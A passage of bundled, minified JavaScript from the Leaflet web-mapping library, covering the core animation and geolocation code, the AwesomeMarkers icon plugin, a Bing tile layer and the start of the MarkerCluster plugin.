checked="checked"'),n+="/>";var o=e.createElement("div");return o.innerHTML=n,o.firstChild},_addItem:function(t){var i,o=e.createElement("label"),s=this._map.hasLayer(t.layer);t.overlay?(i=e.createElement("input"),i.type="checkbox",i.className="leaflet-control-layers-selector",i.defaultChecked=s):i=this._createRadioElement("leaflet-base-layers",s),i.layerId=n.stamp(t.layer),n.DomEvent.on(i,"click",this._onInputClick,this);var a=e.createElement("span");a.innerHTML=" "+t.name,o.appendChild(i),o.appendChild(a);var r=t.overlay?this._overlaysList:this._baseLayersList;return r.appendChild(o),o},_onInputClick:function(){var t,e,i,n,o=this._form.getElementsByTagName("input"),s=o.length;for(this._handlingClick=!0,t=0;s>t;t++)e=o[t],i=this._layers[e.layerId],e.checked&&!this._map.hasLayer(i.layer)?(this._map.addLayer(i.layer),i.overlay?this._map.fire("overlayadd",{layer:i}):n=i.layer):!e.checked&&this._map.hasLayer(i.layer)&&(this._map.removeLayer(i.layer),this._map.fire("overlayremove",{layer:i}));n&&(this._map.setZoom(this._map.getZoom()),this._map.fire("baselayerchange",{layer:n})),this._handlingClick=!1},_expand:function(){n.DomUtil.addClass(this._container,"leaflet-control-layers-expanded")},_collapse:function(){this._container.className=this._container.className.replace(" leaflet-control-layers-expanded","")}}),n.control.layers=function(t,e,i){return new n.Control.Layers(t,e,i)},n.PosAnimation=n.Class.extend({includes:n.Mixin.Events,run:function(t,e,i,o){this.stop(),this._el=t,this._inProgress=!0,this.fire("start"),t.style[n.DomUtil.TRANSITION]="all "+(i||.25)+"s cubic-bezier(0,0,"+(o||.5)+",1)",n.DomEvent.on(t,n.DomUtil.TRANSITION_END,this._onTransitionEnd,this),n.DomUtil.setPosition(t,e),n.Util.falseFn(t.offsetWidth),this._stepTimer=setInterval(n.bind(this.fire,this,"step"),50)},stop:function(){this._inProgress&&(n.DomUtil.setPosition(this._el,this._getPos()),this._onTransitionEnd(),n.Util.falseFn(this._el.offsetWidth))},_transformRe:/(-?[\d\.]+), (-?[\d\.]+)\)/,_getPos:function(){var e,i,o,s=this._el,a=t.getComputedStyle(s);return n.Browser.any3d?(o=a[n.DomUtil.TRANSFORM].match(this._transformRe),e=parseFloat(o[1]),i=parseFloat(o[2])):(e=parseFloat(a.left),i=parseFloat(a.top)),new n.Point(e,i,!0)},_onTransitionEnd:function(){n.DomEvent.off(this._el,n.DomUtil.TRANSITION_END,this._onTransitionEnd,this),this._inProgress&&(this._inProgress=!1,this._el.style[n.DomUtil.TRANSITION]="",clearInterval(this._stepTimer),this.fire("step").fire("end"))}}),n.Map.include({setView:function(t,e,i){e=this._limitZoom(e),t=n.latLng(t),this._panAnim&&this._panAnim.stop();var o=this._zoom!==e,s=this._loaded&&!i&&!!this._layers;if(s){var a=o?this.options.zoomAnimation&&this._animateZoomIfClose&&this._animateZoomIfClose(t,e):this._animatePanIfClose(t);if(a)return clearTimeout(this._sizeTimer),this}return this._resetView(t,e),this},panBy:function(t,e,i,o){if(t=n.point(t).round(),!t.x&&!t.y)return this;this._panAnim||(this._panAnim=new n.PosAnimation,this._panAnim.on({step:this._onPanTransitionStep,end:this._onPanTransitionEnd},this)),o||this.fire("movestart"),n.DomUtil.addClass(this._mapPane,"leaflet-pan-anim");var s=this._getMapPanePos().subtract(t);return this._panAnim.run(this._mapPane,s,e||.25,i),this},_onPanTransitionStep:function(){this.fire("move")},_onPanTransitionEnd:function(){n.DomUtil.removeClass(this._mapPane,"leaflet-pan-anim"),this.fire("moveend")},_animatePanIfClose:function(t){var e=this._getCenterOffset(t)._floor();return this.getSize().contains(e)?(this.panBy(e),!0):!1}}),n.PosAnimation=n.DomUtil.TRANSITION?n.PosAnimation:n.PosAnimation.extend({run:function(t,e,i,o){this.stop(),this._el=t,this._inProgress=!0,this._duration=i||.25,this._easeOutPower=1/Math.max(o||.5,.2),this._startPos=n.DomUtil.getPosition(t),this._offset=e.subtract(this._startPos),this._startTime=+new Date,this.fire("start"),this._animate()},stop:function(){this._inProgress&&(this._step(),this._complete())},_animate:function(){this._animId=n.Util.requestAnimFrame(this._animate,this),this._step()},_step:function(){var t=+new Date-this._startTime,e=1e3*this._duration;e>t?this._runFrame(this._easeOut(t/e)):(this._runFrame(1),this._complete())},_runFrame:function(t){var e=this._startPos.add(this._offset.multiplyBy(t));n.DomUtil.setPosition(this._el,e),this.fire("step")},_complete:function(){n.Util.cancelAnimFrame(this._animId),this._inProgress=!1,this.fire("end")},_easeOut:function(t){return 1-Math.pow(1-t,this._easeOutPower)}}),n.Map.mergeOptions({zoomAnimation:n.DomUtil.TRANSITION&&!n.Browser.android23&&!n.Browser.mobileOpera}),n.DomUtil.TRANSITION&&n.Map.addInitHook(function(){n.DomEvent.on(this._mapPane,n.DomUtil.TRANSITION_END,this._catchTransitionEnd,this)}),n.Map.include(n.DomUtil.TRANSITION?{_catchTransitionEnd:function(){this._animatingZoom&&this._onZoomTransitionEnd()},_animateZoomIfClose:function(t,e){if(this._animatingZoom)return!0;var i=this.getZoomScale(e),n=this._getCenterOffset(t)._divideBy(1-1/i),o=this._getCenterLayerPoint()._add(n);return this.getSize().contains(n)?(this.fire("movestart").fire("zoomstart"),this._animateZoom(t,e,o,i),!0):!1},_animateZoom:function(t,e,i,o,s,a){this._animatingZoom=!0,n.DomUtil.addClass(this._mapPane,"leaflet-zoom-anim"),this._animateToCenter=t,this._animateToZoom=e,n.Draggable&&(n.Draggable._disabled=!0),this.fire("zoomanim",{center:t,zoom:e,origin:i,scale:o,delta:s,backwards:a})},_onZoomTransitionEnd:function(){this._animatingZoom=!1,n.DomUtil.removeClass(this._mapPane,"leaflet-zoom-anim"),this._resetView(this._animateToCenter,this._animateToZoom,!0,!0),n.Draggable&&(n.Draggable._disabled=!1)}}:{}),n.TileLayer.include({_animateZoom:function(t){var e=!1;this._animating||(this._animating=!0,e=!0),e&&this._prepareBgBuffer();var i=n.DomUtil.TRANSFORM,o=this._bgBuffer;e&&(clearTimeout(this._clearBgBufferTimer),n.Util.falseFn(o.offsetWidth));var s=n.DomUtil.getScaleString(t.scale,t.origin),a=o.style[i];o.style[i]=t.backwards?(t.delta?n.DomUtil.getTranslateString(t.delta):a)+" "+s:s+" "+a},_endZoomAnim:function(){var t=this._tileContainer,e=this._bgBuffer;t.style.visibility="",t.style.zIndex=2,e.style.zIndex=1,n.Util.falseFn(e.offsetWidth),this._animating=!1},_clearBgBuffer:function(){var t=this._map;t._animatingZoom||t.touchZoom._zooming||(this._bgBuffer.innerHTML="",this._bgBuffer.style[n.DomUtil.TRANSFORM]="")},_prepareBgBuffer:function(){var t=this._tileContainer,e=this._bgBuffer;return e&&this._getLoadedTilesPercentage(e)>.5&&.5>this._getLoadedTilesPercentage(t)?(t.style.visibility="hidden",this._stopLoadingImages(t),i):(e.style.visibility="hidden",e.style[n.DomUtil.TRANSFORM]="",this._tileContainer=e,e=this._bgBuffer=t,this._stopLoadingImages(e),i)},_getLoadedTilesPercentage:function(t){var e,i,n=t.getElementsByTagName("img"),o=0;for(e=0,i=n.length;i>e;e++)n[e].complete&&o++;return o/i},_stopLoadingImages:function(t){var e,i,o,s=Array.prototype.slice.call(t.getElementsByTagName("img"));for(e=0,i=s.length;i>e;e++)o=s[e],o.complete||(o.onload=n.Util.falseFn,o.onerror=n.Util.falseFn,o.src=n.Util.emptyImageUrl,o.parentNode.removeChild(o))}}),n.Map.include({_defaultLocateOptions:{watch:!1,setView:!1,maxZoom:1/0,timeout:1e4,maximumAge:0,enableHighAccuracy:!1},locate:function(t){if(t=this._locationOptions=n.extend(this._defaultLocateOptions,t),!navigator.geolocation)return this._handleGeolocationError({code:0,message:"Geolocation not supported."}),this;var e=n.bind(this._handleGeolocationResponse,this),i=n.bind(this._handleGeolocationError,this);return t.watch?this._locationWatchId=navigator.geolocation.watchPosition(e,i,t):navigator.geolocation.getCurrentPosition(e,i,t),this},stopLocate:function(){return navigator.geolocation&&navigator.geolocation.clearWatch(this._locationWatchId),this},_handleGeolocationError:function(t){var e=t.code,i=t.message||(1===e?"permission denied":2===e?"position unavailable":"timeout");this._locationOptions.setView&&!this._loaded&&this.fitWorld(),this.fire("locationerror",{code:e,message:"Geolocation error: "+i+"."})},_handleGeolocationResponse:function(t){var e=t.coords.latitude,i=t.coords.longitude,o=new n.LatLng(e,i),s=180*t.coords.accuracy/40075017,a=s/Math.cos(n.LatLng.DEG_TO_RAD*e),r=new n.LatLng(e-s,i-a),h=new n.LatLng(e+s,i+a),l=new n.LatLngBounds(r,h),u=this._locationOptions;if(u.setView){var c=Math.min(this.getBoundsZoom(l),u.maxZoom);this.setView(o,c)}var _=n.extend({latlng:o,bounds:l},t.coords);this.fire("locationfound",_)}})})(window,document);
// leafletjs/leaflet.awesome-markers.js

(function(window,document,undefined){L.AwesomeMarkers={};L.AwesomeMarkers.version='1.0';L.AwesomeMarkers.Icon=L.Icon.extend({options:{iconSize:[35,45],iconAnchor:[17,42],popupAnchor:[1,-32],shadowAnchor:[10,12],shadowSize:[36,16],className:'awesome-marker',icon:'home',color:'blue',iconColor:'white'},initialize:function(options){options=L.setOptions(this,options);},createIcon:function(){var div=document.createElement('div'),options=this.options;if(options.icon){div.innerHTML=this._createInner();}
if(options.bgPos){div.style.backgroundPosition=(-options.bgPos.x)+'px '+(-options.bgPos.y)+'px';}
this._setIconStyles(div,'icon-'+options.color);return div;},_createInner:function(){var iconClass;if(this.options.icon.slice(0,5)==="icon-"){iconClass=this.options.icon;}else{iconClass="icon-"+this.options.icon;}
return"<i class='"+iconClass
+(this.options.spin?" icon-spin":"")
+(this.options.iconColor?" icon-"+this.options.iconColor:"")+"'></i>";},_setIconStyles:function(img,name){var options=this.options,size=L.point(options[name=='shadow'?'shadowSize':'iconSize']),anchor;if(name==='shadow'){anchor=L.point(options.shadowAnchor||options.iconAnchor);}else{anchor=L.point(options.iconAnchor);}
if(!anchor&&size){anchor=size.divideBy(2,true);}
img.className='awesome-marker-'+name+' '+options.className;if(anchor){img.style.marginLeft=(-anchor.x)+'px';img.style.marginTop=(-anchor.y)+'px';}
if(size){img.style.width=size.x+'px';img.style.height=size.y+'px';}},createShadow:function(){var div=document.createElement('div'),options=this.options;this._setIconStyles(div,'shadow');return div;}});L.AwesomeMarkers.icon=function(options){return new L.AwesomeMarkers.Icon(options);};}(this,document));
// leafletjs/BingLayer.js

L.BingLayer=L.TileLayer.extend({options:{subdomains:[0,1,2,3],type:'Road',attribution:'Bing',culture:''},initialize:function(key,options){L.Util.setOptions(this,options);this._key=key;this._url=null;this.meta={};this.loadMetadata();},tile2quad:function(x,y,z){var quad='';for(var i=z;i>0;i--){var digit=0;var mask=1<<(i-1);if((x&mask)!=0)digit+=1;if((y&mask)!=0)digit+=2;quad=quad+digit;}
return quad;},getTileUrl:function(p,z){var z=this._getZoomForUrl();var subdomains=this.options.subdomains,s=this.options.subdomains[Math.abs((p.x+p.y)%subdomains.length)];return this._url.replace('{subdomain}',s).replace('{quadkey}',this.tile2quad(p.x,p.y,z)).replace('{culture}',this.options.culture);},loadMetadata:function(){var _this=this;var cbid='_bing_metadata_'+L.Util.stamp(this);window[cbid]=function(meta){_this.meta=meta;window[cbid]=undefined;var e=document.getElementById(cbid);e.parentNode.removeChild(e);if(meta.errorDetails){alert("Got metadata"+meta.errorDetails);return;}
_this.initMetadata();};var url="http://dev.virtualearth.net/REST/v1/Imagery/Metadata/"+this.options.type+"?include=ImageryProviders&jsonp="+cbid+"&key="+this._key;var script=document.createElement("script");script.type="text/javascript";script.src=url;script.id=cbid;document.getElementsByTagName("head")[0].appendChild(script);},initMetadata:function(){var r=this.meta.resourceSets[0].resources[0];this.options.subdomains=r.imageUrlSubdomains;this._url=r.imageUrl;this._providers=[];for(var i=0;i<r.imageryProviders.length;i++){var p=r.imageryProviders[i];for(var j=0;j<p.coverageAreas.length;j++){var c=p.coverageAreas[j];var coverage={zoomMin:c.zoomMin,zoomMax:c.zoomMax,active:false};var bounds=new L.LatLngBounds(new L.LatLng(c.bbox[0]+0.01,c.bbox[1]+0.01),new L.LatLng(c.bbox[2]-0.01,c.bbox[3]-0.01));coverage.bounds=bounds;coverage.attrib=p.attribution;this._providers.push(coverage);}}
this._update();},_update:function(){if(this._url==null||!this._map)return;this._update_attribution();L.TileLayer.prototype._update.apply(this,[]);},_update_attribution:function(){var bounds=this._map.getBounds();var zoom=this._map.getZoom();for(var i=0;i<this._providers.length;i++){var p=this._providers[i];if((zoom<=p.zoomMax&&zoom>=p.zoomMin)&&bounds.intersects(p.bounds)){if(!p.active)
this._map.attributionControl.addAttribution(p.attrib);p.active=true;}else{if(p.active)
this._map.attributionControl.removeAttribution(p.attrib);p.active=false;}}},onRemove:function(map){for(var i=0;i<this._providers.length;i++){var p=this._providers[i];if(p.active){this._map.attributionControl.removeAttribution(p.attrib);p.active=false;}}
L.TileLayer.prototype.onRemove.apply(this,[map]);}});
// leafletjs/latest/cluster.js

(function(){L.MarkerClusterGroup=L.FeatureGroup.extend({options:{maxClusterRadius:80,iconCreateFunction:null,spiderfyOnMaxZoom:true,showCoverageOnHover:true,zoomToBoundsOnClick:true,singleMarkerMode:false,disableClusteringAtZoom:null,removeOutsideVisibleBounds:true,animateAddingMarkers:false,spiderfyDistanceMultiplier:1,polygonOptions:{}},initialize:function(options){L.Util.setOptions(this,options);if(!this.options.iconCreateFunction){this.options.iconCreateFunction=this._defaultIconCreateFunction;}
L.FeatureGroup.prototype.initialize.call(this,[]);this._inZoomAnimation=0;this._needsClustering=[];this._currentShownBounds=null;},addLayer:function(layer){if(layer instanceof L.LayerGroup){var array=[];for(var i in layer._layers){array.push(layer._layers[i]);}
return this.addLayers(array);}
if(!this._map){this._needsClustering.push(layer);return this;}
if(this.hasLayer(layer)){return this;}
if(this._unspiderfy){this._unspiderfy();}
this._addLayer(layer,this._maxZoom);var visibleLayer=layer,currentZoom=this._map.getZoom();if(layer.__parent){while(visibleLayer.__parent._zoom>=currentZoom){visibleLayer=visibleLayer.__parent;}}
if(this._currentShownBounds.contains(visibleLayer.getLatLng())){if(this.options.animateAddingMarkers){this._animationAddLayer(layer,visibleLayer);}else{this._animationAddLayerNonAnimated(layer,visibleLayer);}}
return this;},removeLayer:function(layer){if(!this._map){this._arraySplice(this._needsClustering,layer);return this;}
if(!layer.__parent){return this;}
if(this._unspiderfy){this._unspiderfy();this._unspiderfyLayer(layer);}
this._removeLayer(layer,true);if(layer._icon){L.FeatureGroup.prototype.removeLayer.call(this,layer);layer.setOpacity(1);}
return this;},addLayers:function(layersArray){var i,l,m;if(!this._map){this._needsClustering=this._needsClustering.concat(layersArray);return this;}
for(i=0,l=layersArray.length;i<l;i++){m=layersArray[i];if(this.hasLayer(m)){continue;}
this._addLayer(m,this._maxZoom);if(m.__parent){if(m.__parent.getChildCount()===2){var markers=m.__parent.getAllChildMarkers(),otherMarker=markers[0]===m?markers[1]:markers[0];L.FeatureGroup.prototype.removeLayer.call(this,otherMarker);}}}
for(i in this._layers){m=this._layers[i];if(m instanceof L.MarkerCluster&&m._iconNeedsUpdate){m._updateIcon();}}
this._topClusterLevel._recursivelyAddChildrenToMap(null,this._zoom,this._currentShownBounds);return this;},removeLayers:function(layersArray){var i,l,m;if(!this._map){for(i=0,l=layersArray.length;i<l;i++){this._arraySplice(this._needsClustering,layersArray[i]);}
return this;}
for(i=0,l=layersArray.length;i<l;i++){m=layersArray[i];if(!m.__parent){continue;}
this._removeLayer(m,true,true);if(m._icon){L.FeatureGroup.prototype.removeLayer.call(this,m);m.setOpacity(1);}}
this._topClusterLevel._recursivelyAddChildrenToMap(null,this._zoom,this._currentShownBounds);for(i in this._layers){m=this._layers[i];if(m instanceof L.MarkerCluster){m._updateIcon();}}
return this;},clearLayers:function(){if(!this._map){this._needsClustering=[];delete this._gridClusters;delete this._gridUnclustered;}
if(this._noanimationUnspiderfy){this._noanimationUnspiderfy();}
for(var i in this._layers){L.FeatureGroup.prototype.removeLayer.call(this,this._layers[i]);}
this.eachLayer(function(marker){delete marker.__parent;});if(this._map){this._generateInitialClusters();}
return this;},getBounds:function(){var bounds=new L.LatLngBounds();if(this._topClusterLevel){bounds.extend(this._topClusterLevel._bounds);}else{for(var i=this._needsClustering.length-1;i>=0;i--){bounds.extend(this._needsClustering[i].getLatLng());}}
return bounds;},eachLayer:function(method,context){var markers=this._needsClustering.slice(),i;if(this._topClusterLevel){this._topClusterLevel.getAllChildMarkers(markers);}
for(i=markers.length-1;i>=0;i--){method.call(context,markers[i]);}},hasLayer:function(layer){if(layer._noHas){return false;}
if(this._needsClustering.length>0){var anArray=this._needsClustering;for(var i=anArray.length-1;i>=0;i--){if(anArray[i]===layer){return true;}}}
return!!(layer.__parent&&layer.__parent._group===this);},zoomToShowLayer:function(layer,callback){var showMarker=function(){if((layer._icon||layer.__parent._icon)&&!this._inZoomAnimation){this._map.off('moveend',showMarker,this);this.off('animationend',showMarker,this);if(layer._icon){callback();}else if(layer.__parent._icon){var afterSpiderfy=function(){this.off('spiderfied',afterSpiderfy,this);callback();};this.on('spiderfied',afterSpiderfy,this);layer.__parent.spiderfy();}}};if(layer._icon){callback();}else if(layer.__parent._zoom<this._map.getZoom()){this._map.on('moveend',showMarker,this);if(!layer._icon){this._map.panTo(layer.getLatLng());}}else{this._map.on('moveend',showMarker,this);this.on('animationend',showMarker,this);this._map.setView(layer.getLatLng(),layer.__parent._zoom+1);layer.__parent.zoomToBounds();}},onAdd:function(map){this._map=map;if(!this._gridClusters){this._generateInitialClusters();}
for(var i=0,l=this._needsClustering.length;i<l;i++){var layer=this._needsClustering[i];if(layer.__parent){continue;}
this._addLayer(layer,this._maxZoom);}
this._needsClustering=[];this._map.on('zoomend',this._zoomEnd,this);this._map.on('moveend',this._moveEnd,this);if(this._spiderfierOnAdd){this._spiderfierOnAdd();}
this._bindEvents();this._zoom=this._map.getZoom();this._currentShownBounds=this._getExpandedVisibleBounds();this._topClusterLevel._recursivelyAddChildrenToMap(null,this._zoom,this._currentShownBounds);},onRemove:function(map){map.off('zoomend',this._zoomEnd,this);map.off('moveend',this._moveEnd,this);this._unbindEvents();this._map._mapPane.className=this._map._mapPane.className.replace(' leaflet-cluster-anim','');if(this._spiderfierOnRemove){this._spiderfierOnRemove();}
for(var i in this._layers){L.FeatureGroup.prototype.removeLayer.call(this,this._layers[i]);}
this._map=null;},_arraySplice:function(anArray,obj){for(var i=anArray.length-1;i>=0;i--){if(anArray[i]===obj){anArray.splice(i,1);return;}}},_removeLayer:function(marker,removeFromDistanceGrid,dontUpdateMap){var gridClusters=this._gridClusters,gridUnclustered=this._gridUnclustered,map=this._map;if(removeFromDistanceGrid){for(var z=this._maxZoom;z>=0;z--){if(!gridUnclustered[z].removeObject(marker,map.project(marker.getLatLng(),z))){break;}}}
var cluster=marker.__parent,markers=cluster._markers,otherMarker;this._arraySplice(markers,marker);while(cluster){cluster._childCount--;if(cluster._zoom<0){break;}else if(removeFromDistanceGrid&&cluster._childCount<=1){otherMarker=cluster._markers[0]===marker?cluster._markers[1]:cluster._markers[0];gridClusters[cluster._zoom].removeObject(cluster,map.project(cluster._cLatLng,cluster._zoom));gridUnclustered[cluster._zoom].addObject(otherMarker,map.project(otherMarker.getLatLng(),cluster._zoom));this._arraySplice(cluster.__parent._childClusters,cluster);cluster.__parent._markers.push(otherMarker);otherMarker.__parent=cluster.__parent;if(cluster._icon){L.FeatureGroup.prototype.removeLayer.call(this,cluster);if(!dontUpdateMap){L.FeatureGroup.prototype.addLayer.call(this,otherMarker);}}}else{cluster._recalculateBounds();if(!dontUpdateMap||!cluster._icon){cluster._updateIcon();}}
cluster=cluster.__parent;}
delete marker.__parent;},_propagateEvent:function(e){if(e.target instanceof L.MarkerCluster){e.type='cluster'+e.type;}
L.FeatureGroup.prototype._propagateEvent.call(this,e);},_defaultIconCreateFunction:function(cluster){var childCount=cluster.getChildCount();var c=' marker-cluster-';if(childCount<10){c+='small';}else if(childCount<100){c+='medium';}else{c+='large';}
return new L.DivIcon({html:'<div><span>'+childCount+'</span></div>',className:'marker-cluster'+c,iconSize:new L.Point(40,40)});},_bindEvents:function(){var shownPolygon=null,map=this._map,spiderfyOnMaxZoom=this.options.spiderfyOnMaxZoom,showCoverageOnHover=this.options.showCoverageOnHover,zoomToBoundsOnClick=this.options.zoomToBoundsOnClick;if(spiderfyOnMaxZoom||zoomToBoundsOnClick){this.on('clusterclick',function(a){if(map.getMaxZoom()===map.getZoom()){if(spiderfyOnMaxZoom){a.layer.spiderfy();}}else if(zoomToBoundsOnClick){a.layer.zoomToBounds();}},this);}
if(showCoverageOnHover){this.on('clustermouseover',function(a){if(this._inZoomAnimation){return;}
if(shownPolygon){map.removeLayer(shownPolygon);}
if(a.layer.getChildCount()>2&&a.layer!==this._spiderfied){shownPolygon=new L.Polygon(a.layer.getConvexHull(),this.options.polygonOptions);map.addLayer(shownPolygon);}},this);this.on('clustermouseout',function(){if(shownPolygon){map.removeLayer(shownPolygon);shownPolygon=null;}},this);map.on('zoomend',function(){if(shownPolygon){map.removeLayer(shownPolygon);shownPolygon=null;}},this);map.on('layerremove',function(opt){if(shownPolygon&&opt.layer===this){map.removeLayer(shownPolygon);shownPolygon=null;}},this);}},_unbindEvents:function(){var spiderfyOnMaxZoom=this.options.spiderfyOnMaxZoom,showCoverageOnHover=this.options.showCoverageOnHover,zoomToBoundsOnClick=this.options.zoomToBoundsOnClick,map=this._map;if(spiderfyOnMaxZoom||zoomToBoundsOnClick){this.off('clusterclick',null,this);}
if(showCoverageOnHover){this.off('clustermouseover',null,this);this.off('clustermouseout',null,this);map.off('zoomend',null,this);map.off('layerremove',null,this);}},_zoomEnd:function(){if(!this._map){return;}
this._mergeSplitClusters();this._zoom=this._map._zoom;this._currentShownBounds=this._getExpandedVisibleBounds();},_moveEnd:function(){if(this._inZoomAnimation){return;}
var newBounds=this._getExpandedVisibleBounds();this._topClusterLevel._recursivelyRemoveChildrenFromMap(this._currentShownBounds,this._zoom,newBounds);this._topClusterLevel._recursivelyAddChildrenToMap(null,this._zoom,newBounds);this._currentShownBounds=newBounds;return;},_generateInitialClusters:function(){var maxZoom=this._map.getMaxZoom(),radius=this.options.maxClusterRadius;if(this.options.disableClusteringAtZoom){maxZoom=this.options.disableClusteringAtZoom-1;}
this._maxZoom=maxZoom;this._gridClusters={};this._gridUnclustered={};for(var zoom=maxZoom;zoom>=0;zoom--){this._gridClusters[zoom]=new L.DistanceGrid(radius);this._gridUnclustered[zoom]=new L.DistanceGrid(radius);}
this._topClusterLevel=new L.MarkerCluster(this,-1);},_addLayer:function(layer,zoom){var gridClusters=this._gridClusters,gridUnclustered=this._gridUnclustered,markerPoint,z;if(this.options.singleMarkerMode){layer.options.icon=this.options.iconCreateFunction({getChildCount:function(){return 1;},getAllChildMarkers:function(){return[layer];}});}
for(;zoom>=0;zoom--){markerPoint=this._map.project(layer.getLatLng(),zoom);var closest=gridClusters[zoom].getNearObject(markerPoint);if(closest){closest._addChild(layer);layer.__parent=closest;return;}
closest=gridUnclustered[zoom].getNearObject(markerPoint);if(closest){var parent=closest.__parent;if(parent){this._removeLayer(closest,false);}
var newCluster=new L.MarkerCluster(this,zoom,closest,layer);gridClusters[zoom].addObject(newCluster,this._map.project(newCluster._cLatLng,zoom));closest.__parent=newCluster;layer.__parent=newCluster;var lastParent=newCluster;for(z=zoom-1;z>parent._zoom;z--){lastParent=new L.MarkerCluster(this,z,lastParent);gridClusters[z].addObject(lastParent,this._map.project(closest.getLatLng(),z));}
parent._addChild(lastParent);for(z=zoom;z>=0;z--){if(!gridUnclustered[z].removeObject(closest,this._map.project(closest.getLatLng(),z))){break;}}
return;}
gridUnclustered[zoom].addObject(layer,markerPoint);}
this._topClusterLevel._addChild(layer);layer.__parent=this._topClusterLevel;return;},_mergeSplitClusters:function(){if(this._zoom<this._map._zoom){this._animationStart();this._topClusterLevel._recursivelyRemoveChildrenFromMap(this._currentShownBounds,this._zoom,this._getExpandedVisibleBounds());this._animationZoomIn(this._zoom,this._map._zoom);}else if(this._zoom>this._map._zoom){this._animationStart();this._animationZoomOut(this._zoom,this._map._zoom);}else{this._moveEnd();}},_getExpandedVisibleBounds:function(){if(!this.options.removeOutsideVisibleBounds){return this.getBounds();}
var map=this._map,bounds=map.getBounds(),sw=bounds._southWest,ne=bounds._northEast,latDiff=L.Browser.mobile?0:Math.abs(sw.lat-ne.lat),lngDiff=L.Browser.mobile?0:Math.abs(sw.lng-ne.lng);return new L.LatLngBounds(new L.LatLng(sw.lat-latDiff,sw.lng-lngDiff,true),new L.LatLng(ne.lat+latDiff,ne.lng+lngDiff,true));},_animationAddLayerNonAnimated:function(layer,newCluster){if(newCluster===layer){L.FeatureGroup.prototype.addLayer.call(this,layer);}else if(newCluster._childCount===2){newCluster._addToMap();var markers=newCluster.getAllChildMarkers();L.FeatureGroup.prototype.removeLayer.call(this,markers[0]);L.FeatureGroup.prototype.removeLayer.call(this,markers[1]);}else{newCluster._updateIcon();}}});L.MarkerClusterGroup.include(!L.DomUtil.TRANSITION?{_animationStart:function(){},_animationZoomIn:function(previousZoomLevel,newZoomLevel){this._topClusterLevel._recursivelyRemoveChildrenFromMap(this._currentShownBounds,previousZoomLevel);this._topClusterLevel._recursivelyAddChildrenToMap(null,newZoomLevel,this._getExpandedVisibleBounds());},_animationZoomOut:function(previousZoomLevel,newZoomLevel){this._topClusterLevel._recursivelyRemoveChildrenFromMap(this._currentShownBounds,previousZoomLevel);this._topClusterLevel._recursivelyAddChildrenToMap(null,newZoomLevel,this._getExpandedVisibleBounds());},_animationAddLayer:function(layer,newCluster){this._animationAddLayerNonAnimated(layer,newCluster);}}:{_animationStart:function(){this._map._mapPane.className+=' leaflet-cluster-anim';this._inZoomAnimation++;},_animationEnd:function(){if(this._map){this._map._mapPane.className=this._map._mapPane.className.replace(' leaflet-cluster-anim','');}
this._inZoomAnimation--;this.fire('animationend');},_animationZoomIn:function(previousZoomLevel,newZoomLevel){var me=this,bounds=this._getExpandedVisibleBounds(),i;this._topClusterLevel._recursively(bounds,previousZoomLevel,0,function(c){var startPos=c._latlng,markers=c._markers,m;if(c._isSingleParent()&&previousZoomLevel+1===newZoomLevel){L.FeatureGroup.prototype.removeLayer.call(me,c);c._recursivelyAddChildrenToMap(null,newZoomLevel,bounds);}else{c.setOpacity(0);c._recursivelyAddChildrenToMap(startPos,newZoomLevel,bounds);}
for(i=markers.length-1;i>=0;i--){m=markers[i];if(!bounds.contains(m._latlng)){L.FeatureGroup.prototype.removeLayer.call(me,m);}}});this._forceLayout();var j,n;me._topClusterLevel._recursivelyBecomeVisible(bounds,newZoomLevel);for(j in me._layers){n=me._layers[j];if(!(n instanceof L.MarkerCluster)&&n._icon){n.setOpacity(1);}}
me._topClusterLevel._recursively(bounds,previousZoomLevel,newZoomLevel,function(c){c._recursivelyRestoreChildPositions(newZoomLevel);});setTimeout(function(){me._topClusterLevel._recursively(bounds,previousZoomLevel,0,function(c){L.FeatureGroup.prototype.removeLayer.call(me,c);c.setOpacity(1);});me._animationEnd();},200);},_animationZoomOut:function(previousZoomLevel,newZoomLevel){this._animationZoomOutSingle(this._topClusterLevel,previousZoomLevel-1,newZoomLevel);this._topClusterLevel._recursivelyAddChildrenToMap(null,newZoomLevel,this._getExpandedVisibleBounds());this._topClusterLevel._recursivelyRemoveChildrenFromMap(this._currentShownBounds,previousZoomLevel,this._getExpandedVisibleBounds());},_animationZoomOutSingle:function(cluster,previousZoomLevel,newZoomLevel){var bounds=this._getExpandedVisibleBounds();cluster._recursivelyAnimateChildrenInAndAddSelfToMap(bounds,previousZoomLevel+1,newZoomLevel);var me=this;this._forceLayout();cluster._recursivelyBecomeVisible(bounds,newZoomLevel);setTimeout(function(){if(cluster._childCount===1){var m=cluster._markers[0];m.setLatLng(m.getLatLng());m.setOpacity(1);}else{cluster._recursively(bounds,newZoomLevel,0,function(c){c._recursivelyRemoveChildrenFromMap(bounds,previousZoomLevel+1);});}
me._animationEnd();},200);},_animationAddLayer:function(layer,newCluster){var me=this;L.FeatureGroup.prototype.addLayer.call(this,layer);if(newCluster!==layer){if(newCluster._childCount>2){newCluster._updateIcon();this._forceLayout();this._animationStart();layer._setPos(this._map.latLngToLayerPoint(newCluster.getLatLng()));layer.setOpacity(0);setTimeout(function(){L.FeatureGroup.prototype.removeLayer.call(me,layer);layer.setOpacity(1);me._animationEnd();},200);}else{this._forceLayout();me._animationStart();me._animationZoomOutSingle(newCluster,this._map.getMaxZoom(),this._map.getZoom());}}},_forceLayout:function(){L.Util.falseFn(document.body.offsetWidth);}});L.MarkerCluster=L.Marker.extend({initialize:function(group,zoom,a,b){L.Marker.prototype.initialize.call(this,a?(a._cLatLng||a.getLatLng()):new L.LatLng(0,0),{icon:this});this._group=group;this._zoom=zoom;this._markers=[];this._childClusters=[];this._childCount=0;this._iconNeedsUpdate=true;this._bounds=new L.LatLngBounds();if(a){this._addChild(a);}
if(b){this._addChild(b);}},getAllChildMarkers:function(storageArray){storageArray=storageArray||[];for(var i=this._childClusters.length-1;i>=0;i--){this._childClusters[i].getAllChildMarkers(storageArray);}
for(var j=this._markers.length-1;j>=0;j--){storageArray.push(this._markers[j]);}
return storageArray;},getChildCount:function(){return this._childCount;},zoomToBounds:function(){this._group._map.fitBounds(this._bounds);},getBounds:function(){var bounds=new L.LatLngBounds();bounds.extend(this._bounds);return bounds;},_updateIcon:function(){this._iconNeedsUpdate=true;if(this._icon){this.setIcon(this);}},createIcon:function(){if(this._iconNeedsUpdate){this._iconObj=this._group.options.iconCreateFunction(this);this._iconNeedsUpdate=false;}
